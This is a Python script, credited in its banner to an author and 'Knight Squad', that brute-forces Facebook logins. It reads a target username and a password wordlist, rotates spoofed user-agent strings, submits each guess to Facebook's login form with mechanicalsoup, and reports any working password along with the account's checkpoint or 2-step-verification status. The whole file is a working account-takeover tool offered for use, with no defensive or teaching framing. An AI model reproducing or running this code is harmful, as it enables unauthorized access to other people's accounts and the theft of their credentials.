#! /usr/bin/env python
import os
from random import randint
import urllib.request
import mechanicalsoup
import sys


class FacebookBrute:
    username = ""
    word_list = ""
    FacebookHome = "https://www.facebook.com/"

    @staticmethod
    def clear_screen():
        sys.stdout.write('\x1b[1A')
        sys.stdout.write('\x1b[2K')

    def check_file(self, c_file):
        if os.path.exists(c_file):
            return True
        else:
            return False

    @staticmethod
    def connection(host='https://google.com'):
        try:
            urllib.request.urlopen(host)
            return True
        except:
            return False

    def password_count(self, p_file):
        pc_file = open(p_file)
        counter = 0
        while True:
            line = pc_file.readline()
            if not line:
                break
            counter += 1

        return counter

    @staticmethod
    def help():
        print("Usage..")
        print("python ./facebookbrute.py target_username password_list\n")

    @staticmethod
    def user_agents():
        agents = [
            "Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 "
            "Safari/537.36 ",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 "
            "Safari/537.36 ",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 "
            "Safari/537.36 ",
        ]
        return agents[randint(0, len(agents) - 1)]

    @staticmethod
    def welcome():
        art = '''
                                  .___.
              /)  Facebook     ,-^     ^-. \t Script By
             //   Brute V1    /           \\\t NOMAN
    .-------| |--------------/  __     __  \\-------------------.__
    |WMWMWMW| |>>>>>>>>>>>>> | />>\\   />>\\ |>>>>>>>>>>>>>>>>>>>>>>:>
    `-------| |--------------| \\__/   \\__/ |-------------------'^^
             \\\\               \\    /|\\    /\t https://nomanprodhan.com
              \\) KNIGHT SQUAD  \\   \\_/   / \t GitHub @nomanprodhan
        Facebook @kn16h75qu4d   |       |\tFacebook @im.nomanprodhan
                                |+H+H+H+|
                                \\       /
                                 ^-----^
        '''
        print(art)

    @staticmethod
    def display(display_flag, d_username, d_password, d_wordlist):
        if display_flag == 1:
            print("Valid password found !")
            print("Username/Email/Mobile : " + d_username)
            print("Password : " + d_password)
        elif display_flag == 2:
            print(d_wordlist + " file doesn't exist")
        elif display_flag == 3:
            print("Valid password found !")
            print("Username/Email/Mobile : ", d_username)
            print("Password : ", d_password)
            print("Note : This account stuck in Facebook Identity Confirmation.")
        elif display_flag == 4:
            print("Valid password found !")
            print("Username/Email/Mobile : ", d_username)
            print("Password : ", d_password)
            print("Note : This account have 2-step verification.")
        elif display_flag == 5:
            print("Your internet connection not working properly.")
        else:
            print("Couldn't find any valid password")
            print("Try again with another wordlist")

    def brute_force(self):
        self.welcome()
        if len(sys.argv) <= 1 or len(sys.argv) > 3:
            self.help()
        else:
            self.username = sys.argv[1]
            self.word_list = sys.argv[2]
            if not self.connection():
                self.display(5, "", "", "")
                exit()

            if self.check_file(self.word_list):
                print("Total Passwords : " + str(self.password_count(self.word_list)))
                print("Target Account : " + self.username)
                print("------------\nLaunching The Attack . .")
                word_file = open(self.word_list)
                browser = mechanicalsoup.StatefulBrowser()
                while True:
                    password = word_file.readline()
                    browser.set_user_agent(self.user_agents())
                    browser.open(self.FacebookHome)
                    browser.select_form('form[id="login_form"]')
                    browser['email'] = self.username
                    browser['pass'] = password
                    browser.submit_selected()
                    print("-> User : " + self.username + "\tPassword : " + password)
                    current_page = browser.get_current_page()
                    success = current_page.find("span", class_="_1vp5")
                    checkpoint = current_page.find("div", class_="_1yqt")
                    confirm_identity = current_page.find("div", class_="_2pi2")
                    second_step = current_page.find("div", class_="_2e9n")
                    if success:
                        self.display(1, self.username, password, "")
                        break
                    elif checkpoint or confirm_identity:
                        self.display(3, self.username, password, "")
                        break
                    elif second_step:
                        self.display(4, self.username, password, "")

                    self.clear_screen()
                    if not password:
                        if not success or not checkpoint:
                            self.display(6, "", "", "")
                        break
            else:
                self.display(2, "", "", self.word_list)


facebook = FacebookBrute()
facebook.brute_force()
